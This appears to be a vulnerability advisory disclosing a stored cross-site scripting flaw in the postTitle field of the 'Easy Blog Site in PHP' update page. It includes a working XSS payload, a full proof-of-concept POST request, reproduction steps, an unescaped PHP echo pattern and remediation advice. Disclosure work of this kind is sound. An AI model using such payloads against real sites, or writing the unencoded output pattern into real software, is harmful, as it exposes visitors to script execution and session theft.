## Stored Cross-Site Scripting (XSS) in Easy Blog Site PHP postTitle Parameter
## Credit

Discovered by: Ahmad Marzouk

## Product

Easy Blog Site in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/easy-blog-site-in-php-with-source-code/

## Affected Version

Easy Blog Site in PHP v1.0

## Vulnerability Type

Stored Cross-Site Scripting (Stored XSS)

CWE

CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)

## Severity

Medium

## Description

A Stored Cross-Site Scripting (XSS) vulnerability exists in the Easy Blog Site in PHP within the post update functionality.

The vulnerability occurs in the following endpoint:

/blog/posts/update.php

The application processes user-controlled input via HTTP POST parameters when updating blog posts. The postTitle parameter is directly accepted from user input and stored in the backend database without proper validation or sanitization.

Because the stored value is later rendered in the blog interface without applying output encoding, malicious HTML or JavaScript code can be executed in the browser of users who view the affected post.

During testing, it was confirmed that injecting a malicious payload into the postTitle parameter results in persistent script execution.

 payload used:

<details/open/ontoggle=prompt(origin)>

Once the post is updated, the payload is saved in the database and executed whenever the post is viewed.

This confirms that the vulnerability is a Stored (Persistent) Cross-Site Scripting issue.

## Root Cause

The vulnerability is caused by improper handling of user-controlled input.

The application retrieves the postTitle parameter from the HTTP request and stores it directly in the database without validation or sanitization. When the stored value is later rendered in the HTML interface, it is displayed without applying output encoding such as htmlspecialchars().

A typical vulnerable pattern is:

$postTitle = $_POST['postTitle'];
// stored in DB without sanitization

echo $postTitle; // rendered without encoding

Because the input is not sanitized or encoded, embedded HTML/JavaScript is interpreted and executed by the browser.

## Affected Endpoint
/blog/posts/update.php?id=6
## Vulnerable Parameter
postTitle
## HTTP Method
POST
## Proof of Concept

The following HTTP request demonstrates exploitation:
 ```plain
POST /blog/posts/update.php?id=6 HTTP/1.1
Host: localhost
Content-Length: 1687
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/blog/posts/update.php?id=6
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=pfrfhpk1kdfqadq2crf74kb8gu
Connection: keep-alive

postTitle=%3Cdetails%2Fopen%2Fontoggle%3Dprompt%28origin%29%3E&postDesc=%3Cp%3ESardar+Vallabhbhai+National+Institute+Of+Technology%2C+Surat+is+one+of+the+17+Regional+Engineering+Colleges+that+were+established+as+joint+venture+of+the+Government+of+India+and+the+Government+of+Gujarat.+It+was+established+in+June+1961+with+facilities+to+run+Bachelor%26%2339%3Bs+Degree+Programmes+in+Civil%2C+Electrical+and+Mechanical+Engineering+disciplines.+It+is+now+changed+to+National+Institute+of+Technology+along+with+other+RECs.%26nbsp%3B%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0AThe+college+has+now+been+given+the+status+of+Deemed+University.%26nbsp%3B%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0AThe+college+has+well-established+Central+Learning+resource+centers+like+Central+library%2C+Central+Computer+Centre%2C+Entrepreneurship+Development+Cell%2C+Continuing+Education+Centre+and+Physical+Education+Section.+The+college+also+has+a+very+active+Training+%26amp%3B+Placement+section.%26nbsp%3B%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0AThe+college+has+a+campus+of+its+own%2C+spread+over+100+hectares+of+land+on+the+Surat-Dumas+Highway.+The+college+is+progressing+with+the+construction+of+the+buildings+of+the+academic+sector.+The+college+is+having+in+all+seven+hostels%2C+six+for+boys+%26amp%3B+one+for+girls+students%2C+accommodating+990+students.+The+total+of+191+units+of+staff+quarters+for+different+categories+have+been+built+on+the+campus.+The+college+has+a+Canteen%2C+a+Students+Store%2C+a+Dispensary%2C+a+Guest+House%2C+a+Post+Office%2C+a+branch+of+the+State+Bank+of+India+and+play+ground+for+some+of+the+major+games%2C+viz.+Football%2C+Basketball%2C+Volleyball+and+Cricket.%3C%2Fp%3E%0D%0A&postTag=acm&submit=
 ```
## Steps to Reproduce

Install the Easy Blog Site in PHP.

Login to the admin panel.

Navigate to the post editing page.

Intercept the update request using Burp Suite.

Modify the postTitle parameter:

<details/open/ontoggle=prompt(origin)>

Submit the request.

View the updated blog post.

## Result

The injected JavaScript payload executes in the browser when the post is viewed, confirming that stored input is rendered without sanitization.

## Impact

Successful exploitation allows attackers to:

Execute arbitrary JavaScript in victim browsers

Hijack authenticated sessions

Steal cookies

Perform actions on behalf of users

Inject malicious content into blog posts

Conduct phishing attacks

Because the payload is stored in the database, it affects all users who view the compromised post.

## Vulnerability Classification
CWE

CWE-79 – Cross-Site Scripting

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation
Output Encoding
echo htmlspecialchars($postTitle, ENT_QUOTES, 'UTF-8');
Input Validation

Validate and sanitize user input before storing it.

Content Security Policy
Content-Security-Policy: default-src 'self'

## PoC 

https://github.com/user-attachments/assets/cec42c32-7255-43ab-85f7-e216e858736d
